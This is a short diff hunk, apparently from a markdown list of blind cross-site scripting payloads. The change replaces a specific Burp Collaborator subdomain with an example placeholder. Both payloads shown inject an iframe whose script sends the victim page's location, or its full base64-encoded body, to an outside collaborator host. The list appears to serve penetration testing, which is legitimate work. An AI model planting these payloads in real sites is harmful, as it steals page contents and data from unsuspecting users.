@@ -28,7 +28,7 @@ The following list includes some blind XSS payloads that can be used to proof ev
 
 '"><iframe srcdoc='<script>window.location="https://example.burpcollaborator.net/iframe-srcdoc?"+btoa(parent.document.location)</script>'></iframe>
 
-'"><iframe srcdoc='<script>fetch("https://ugec8ruy5i83ri1lbq4wjx2j9af33s.burpcollaborator.net/iframe-srcdoc-post",{method:"POST",body:btoa(parent.document.body.innerHTML),mode:"no-cors"})</script>'></iframe>
+'"><iframe srcdoc='<script>fetch("https://example.burpcollaborator.net/iframe-srcdoc-post",{method:"POST",body:btoa(parent.document.body.innerHTML),mode:"no-cors"})</script>'></iframe>
 ```
 
 ## Object XSS Payloads
